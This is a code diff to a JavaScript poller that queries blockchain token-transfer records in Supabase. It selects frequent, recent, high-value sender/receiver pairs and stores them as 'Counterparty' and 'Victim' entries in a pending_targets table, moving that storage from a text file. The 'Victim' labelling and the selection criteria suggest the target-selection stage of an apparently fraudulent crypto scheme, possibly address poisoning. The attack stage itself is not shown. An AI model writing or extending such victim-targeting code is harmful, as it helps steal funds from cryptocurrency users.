@@ -1,4 +1,3 @@
-import { appendFile, readFile } from 'fs/promises';
 import { createClient } from '@supabase/supabase-js';
 
 import { config } from '../lib/config.js';
@@ -41,10 +40,8 @@ const BLOCKS_30_DAYS_MAP = {
 };
 const BLOCKS_30_DAYS = BLOCKS_30_DAYS_MAP[chainName] || 216000n;
 
-// Mutex lock to prevent overlapping database queries
 let isFetching = false;
 
-// --- Helper: retry wrapper for DB queries (now using supabase.rpc) ---
 async function withRetry(fn, context, maxAttempts = 3, baseDelay = 1000) {
   let lastError;
   for (let attempt = 1; attempt <= maxAttempts; attempt++) {
@@ -64,10 +61,9 @@ async function withRetry(fn, context, maxAttempts = 3, baseDelay = 1000) {
   throw lastError;
 }
 
-// --- fetchPendingTargets (formerly fetchQualifiedTargets) ---
 async function fetchPendingTargets() {
   if (isFetching) {
-    logger.warn('Database query is still running from the previous interval. Skipping to prevent DB locks.');
+    logger.warn('Database query is still running from the previous interval. Skipping.');
     return;
   }
   
@@ -76,25 +72,7 @@ async function fetchPendingTargets() {
   try {
     logger.info('Fetching qualified pairs (frequency >= 7, last tx within 30 days, min $1000)...');
 
-    // 1. Load existing pairs from the file
-    let existingPairs = new Set();
-    try {
-      const content = await readFile(files.pending, 'utf8');   
-      const lines = content.split('\n').filter(line => line.trim() !== '');
-      lines.forEach(line => {
-        const match = line.match(/Counterparty:\s*(0x[a-fA-F0-9]{40})\s*\|\s*Victim:\s*(0x[a-fA-F0-9]{40})/i);
-        if (match) {
-          const cp = match[1].toLowerCase();
-          const v = match[2].toLowerCase();
-          existingPairs.add(`${cp}|${v}`);
-        }
-      });
-      logger.info(`Loaded ${existingPairs.size} existing pairs from ${files.pending}`);
-    } catch (err) {
-      logger.info('No existing pending file found, starting fresh.');
-    }
-
-    // 2. Get the max block number for this chain from Supabase
+    // 1. Get the max block number for this chain
     const { data: maxBlockData, error: maxBlockError } = await supabase
       .from('token_transfers')
       .select('block_number')
@@ -109,11 +87,10 @@ async function fetchPendingTargets() {
 
     const maxBlock = maxBlockData[0].block_number;
     const maxBlockBigInt = BigInt(maxBlock);
-    
     const blockDiff = Number(maxBlockBigInt - BLOCKS_30_DAYS);
     const thresholdBlock = Math.max(0, blockDiff);
 
-    // 3. Call the SQL function via RPC
+    // 2. Call the SQL function via RPC
     const { data: rows, error: rpcError } = await supabase
       .rpc('fetch_pending_targets', {
         chain_id_param: chainId,
@@ -130,41 +107,44 @@ async function fetchPendingTargets() {
       return;
     }
 
-    const newLines = [];
+    // 3. Insert new pairs into pending_targets (unique constraint will ignore duplicates)
+    let insertedCount = 0;
     for (const row of rows) {
       const cp = row.receiver.toLowerCase();
       const v = row.sender.toLowerCase();
-      const key = `${cp}|${v}`;
-      if (!existingPairs.has(key)) {
-        newLines.push(`Counterparty: ${cp} | Victim: ${v}`);
-        existingPairs.add(key);
+      try {
+        const { error } = await supabase
+          .from('pending_targets')
+          .insert({
+            chain: chainName,
+            counterparty: cp,
+            victim: v,
+            processed: false,
+          });
+        if (error && error.code !== '23505') { // unique violation
+          logger.error(`Failed to insert pair ${cp}|${v}: ${error.message}`);
+        } else if (!error) {
+          insertedCount++;
+        }
+      } catch (err) {
+        logger.error(`Error inserting pair: ${err.message}`);
       }
     }
 
-    if (newLines.length === 0) {
-      logger.info('No new qualified pairs to add.');
-      return;
-    }
+    logger.info(`Added ${insertedCount} new qualified pairs to pending_targets.`);
 
-    const contentToAppend = newLines.join('\n') + '\n';
-    await appendFile(files.pending, contentToAppend, 'utf8');   
-
-    logger.info(`Added ${newLines.length} new qualified pairs to ${files.pending}`);
-    logger.info(`Total pairs in file now: ${existingPairs.size}`);
-
-    if (newLines.length > 50) {
-      await sendAlert(`📊 Found ${newLines.length} new qualified pairs.`);
+    if (insertedCount > 50) {
+      await sendAlert(`📊 Found ${insertedCount} new qualified pairs.`);
     }
 
   } catch (error) {
     logger.error(`Error fetching qualified pairs: ${error.message}`);
     await sendAlert(formatAlert('error', { source: 'fetchPendingTargets', error: error.message }));
   } finally {
-    isFetching = false; // Mutex released securely
+    isFetching = false;
   }
 }
 
-// --- Start the periodic poller ---
 async function startObserver() {
   logger.info('Starting qualified‑targets poller (continuous mode)');
   logger.info(`Polling interval: ${QUALIFIED_POLL_INTERVAL_MS / 1000} seconds`);
@@ -181,15 +161,11 @@ async function startObserver() {
   }, QUALIFIED_POLL_INTERVAL_MS);
 }
 
-// --- Graceful shutdown ---
 setupGracefulShutdown();
-
 onShutdown(async () => {
   logger.info('Observer shutting down gracefully.');
-  // No database pool to close – Supabase client handles it automatically.
 });
 
-// --- Start ---
 startObserver().catch(async (err) => {
   logger.error(`Fatal error: ${err.message}`);
   await sendAlert(formatAlert('error', { source: 'startObserver', error: err.message }));
